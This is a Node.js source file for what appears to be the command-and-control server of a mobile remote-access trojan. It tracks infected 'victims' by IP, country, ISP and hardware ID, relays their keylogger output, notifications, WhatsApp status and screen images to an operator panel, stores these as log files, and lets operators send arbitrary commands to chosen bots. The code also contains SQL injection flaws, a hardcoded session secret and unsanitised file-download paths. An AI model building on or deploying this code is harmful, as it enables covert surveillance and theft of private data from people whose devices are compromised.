import 'dotenv/config.js'

import express from "express";
import { Server } from "socket.io";
import bodyParser from 'body-parser';
import cors from 'cors'
import chalk from "chalk";
import session from "express-session";
import FileStore from "session-file-store";
import crypto from "node:crypto";
import webRoute from "./routes/webRoutes.js";
import pool from "./modules/dbConfig.js"
import fs from "fs"
import path from "path"
import { fileURLToPath } from 'url';
import readLastLines from 'read-last-lines';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const logsDir = path.join(__dirname, 'logresults'); // Directory where files are stored

function appendLog(logMessage, fileName) {
    const now = new Date();
    const year = now.getFullYear();
    const month = (now.getMonth() + 1).toString().padStart(2, '0'); // Month is zero-indexed
    const day = now.getDate().toString().padStart(2, '0');
    const logFilePath = path.join(logsDir, fileName) + ` | ${year}-${month}-${day}` + ".txt";

    // Check if the file exists
    fs.readFile(logFilePath, 'utf8', (err, data) => {
        if (err && err.code === 'ENOENT') {
          // File doesn't exist, so create it and write the log message
          fs.writeFile(logFilePath, logMessage + '\n', (err) => {
            if (err) throw err;
            console.log('Log file created and log appended.');
          });
        } else if (err) {
          console.error('Error reading the log file:', err);
        } else {
          // File exists, check if the log message is already there
          const entries = data.split('Onscreen Text').filter(entry => entry.trim() !== '');
          const logMessageExists = entries.some(entry => entry.includes(logMessage.trim()));
    
          if (!logMessageExists) {
            // Log message does not exist, append it
            fs.appendFile(logFilePath, logMessage + '\n', (writeErr) => {
              if (writeErr) {
                //console.error('Error appending to the log file:', writeErr);
                return;
              }
              //console.log('New data appended successfully.');
            });
          } else {
            // Log message exists, handle as needed
            //console.log('Data already exists in the log.');
            return null;
          }
        }
      });
}

async function queryDatabase(querysql) {
    let conn;
    try {
        conn = await pool.getConnection();
        const result = await conn.query(querysql);
        console.log(`Query : ${querysql}`)
        console.log(`Result :`, result)
        return result;
    } catch (err) {
        console.error(err);
        throw err;
    } finally {
        if (conn) conn.release(); // Release the connection back to the pool
    }
}

// Clearing the database
//await queryDatabase("DELETE FROM victims WHERE ID LIKE '%'")

// Variables
const File_Store = FileStore(session)
const portB = 4000
const portM = 4001
const ipB = "0.0.0.0"
const ipM = "0.0.0.0"
let adminSoc = null;
let victim = null
let adminvictimarr = [];
// Variables

// Express
const app = express()
app.use(cors())
app.use(session({
    store: new File_Store(),
    // secret: crypto.randomBytes(16).toString('hex'),
    secret: "abc",
    resave: false,
    cookie: { maxAge: 1000 * 60 * 60 * 24 },
    saveUninitialized: true
}))
app.use(bodyParser.urlencoded({ extended: true }))
app.use(express.static('static'))
app.use('/', webRoute)
app.post("/login", async (req, res) => {
    var username = req.body.username
    var password = req.body.password

    var result = await queryDatabase(`SELECT name FROM activeuser
    WHERE username = "${username}" AND password = "${password}"`)
    if (!(result.length == 0)) {
        req.session.name = result[0].name
        res.send("ok")
    } else {
        res.send("error")
    }
})

app.post("/info", async (req, res) => {
    var result = await queryDatabase(`SELECT *
    FROM victims
    WHERE ID = "${req.body.id}"`)
    if (!(result.length == 0)) {
        res.json(result[0])
        // victim = botIo.sockets.sockets.get(req.body.id)
        adminvictimarr.forEach(item => {
            if (item.adminId == req.body.adminId) {
                item.victimId = req.body.id
            }
        })
    }

})

app.post("/send", async (req, res) => {
    if (req.body.emit == "" || req.body.id == "") {
        res.status(400).send()
        return
    }

    if (req.body.emit == "ping") {
        botIo.emit("ping", req.body.args)
    } else {
        try {
            adminvictimarr.forEach(item => {
                if (item.adminId == req.body.adminId) {
                    botIo.to(item.victimId).emit(req.body.emit, req.body.args)
                }
            })
            // victim.emit(req.body.emit, req.body.args)
        } catch (error) {
            adminvictimarr.forEach(async item => {
                if (item.adminId == req.body.adminId) {
                    item.victimId = null
                    // await queryDatabase(`DELETE FROM victims
                    // WHERE ID = ${item.victimId}`)
                }
            })
            getRemaining()
            // victim = null

        }
    }
    res.status(200).send("Good")
})

app.get('/files', (req, res) => {
    fs.readdir(logsDir, (err, files) => {
        if (err) {
            console.log(err);
            return res.status(500).send('Server error');
        }
        res.json(files);
    });
});

app.get('/download/:fileName', (req, res) => {
    const fileName = req.params.fileName;
    const filePath = path.join(logsDir, fileName);
    res.download(filePath, fileName, (err) => {
        if (err) {
            console.log(err);
            res.status(500).send('File not found');
        }
    });
});

app.get('/content/:fileName', async (req, res) => {
    const fileName = req.params.fileName;
    const filePath = path.join(logsDir, fileName);
    try {
        const last50Lines = await readLastLines.read(filePath, 50);
        res.send(last50Lines);
    } catch (err) {
        console.error(err);
        res.status(500).send('Error reading file content');
    }
});

const masterServer = app.listen(portM, ipM, () => {
    console.log(`Master Network listening on http://${ipM}:${portM}/`)
})

const masterIo = new Server(masterServer);
const botIo = new Server(portB)


// Socket io Connection for BOTS
console.log(`Bot Network listening on http://${ipB}:${portB}/`)

botIo.on("connection", async (socket) => {
    var data = JSON.parse(socket.handshake.query.info)
    console.log(data)
    await queryDatabase(`IF EXISTS (SELECT 1 FROM victims WHERE HWID = "${data.DeviceID}") THEN
        UPDATE victims
        SET ID = "${socket.id}",
        isOnline = true,
        DeviceName = "${data.DeviceName}"
        WHERE HWID = "${data.DeviceID}";
    ELSE
        INSERT INTO victims (ID, DeviceName, Country, ISP, IP, Brand, Model, Manufacture, HWID, isOnline) 
        VALUES ("${socket.id}", "${data.DeviceName}", "${data.Country}", "${data.ISP}", "${data.IP}", "${data.Brand}", "${data.Model}", "${data.Manufacture}", "${data.DeviceID}", 1);
    END IF;`)

    socket.emit("logger", "start")

    console.log(chalk.green(`[+] Bot Connected (${socket.id}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
    getRemaining()


    socket.on("disconnect", async () => {
        await queryDatabase(`UPDATE victims 
        SET isOnline = 0
        WHERE ID="${socket.id}"`)
        console.log(chalk.redBright(`[x] Bot Disconnected (${socket.id})`))
        getRemaining()
    })

    socket.on("logger", (datalog) => {
        try {
            adminvictimarr.forEach(item => {
                if (socket.id == item.victimId) {
                    masterIo.to(item.adminId).emit("logger", datalog)
                }
            })
            //masterIo.emit("logger", data)
            appendLog(datalog, data.DeviceID + " | " + data.DeviceName)
        } catch (err) {
            console.error(err)
        }
    })

    socket.on("notif", (datalog) => {
        try {
            adminvictimarr.forEach(item => {
                if (socket.id == item.victimId) {
                    masterIo.to(item.adminId).emit("notif", datalog)
                }
            })
            //masterIo.emit("logger", data)
            appendLog(datalog, data.DeviceID + " | " + data.DeviceName)
        } catch (err) {
            console.error(err)
        }
    })

    socket.on("isonwa", (datalog, isonwa) => {
        try {
            adminvictimarr.forEach(item => {
                if (socket.id == item.victimId) {
                    masterIo.to(item.adminId).emit("isonwa", datalog, isonwa)
                }
            })
            //masterIo.emit("logger", data)
            appendLog(datalog, data.DeviceID + " | " + data.DeviceName)
        } catch (err) {
            console.error(err)
        }
    })

    socket.on("keylog", (datalog) => {
        try {
            adminvictimarr.forEach(item => {
                if (socket.id == item.victimId) {
                    masterIo.to(item.adminId).emit("logger", datalog)
                }
            })
            //masterIo.emit("logger", data)
            appendLog(datalog, data.DeviceID + " | " + data.DeviceName)
        } catch (err) {
            console.error(err)
        }
    })


    socket.on("img", (data) => {
        try {
            adminvictimarr.forEach(item => {
                if (socket.id == item.victimId) {
                    masterIo.to(item.adminId).emit("img", data)
                }
            })
            //masterIo.emit("img", data)
        } catch (err) {
            console.error(err)
        }
    })
})


// Socket io Connection for Master
masterIo.on("connection", (socket) => {
    console.log(chalk.greenBright(`[+] Master got Connected (${socket.id})`))
    //adminSoc = socket
    getRemaining()
    socket.emit("masId", socket.id)
    let admindata = {
        adminId: socket.id,
        victimId: null
    }
    adminvictimarr.push(admindata)
    console.log(adminvictimarr)

    socket.on("disconnect", () => {
        console.log(chalk.red(`[x] Master got Disconnected (${socket.id})`))
        const index = adminvictimarr.findIndex(obj => obj.adminId == socket.id);
        if (index !== -1) {
            adminvictimarr.splice(index, 1);
        }
        //adminSoc = null
    })

    socket.on("mouse", (data) => {
        // victim.emit("mouse", data)
    })
    // if (adminSoc == null) {


    // } else {
    //     socket.disconnect()
    // }
})


function getRemaining() {
    queryDatabase("SELECT ID, Brand, Model, HWID, isOnline, DeviceName FROM victims")
        .then(result => {
            if (result.length > 0) {
                masterIo.emit("info", result);
            }
        })
        .catch(err => {
            console.error('Error inserting user:', err);
        });
}






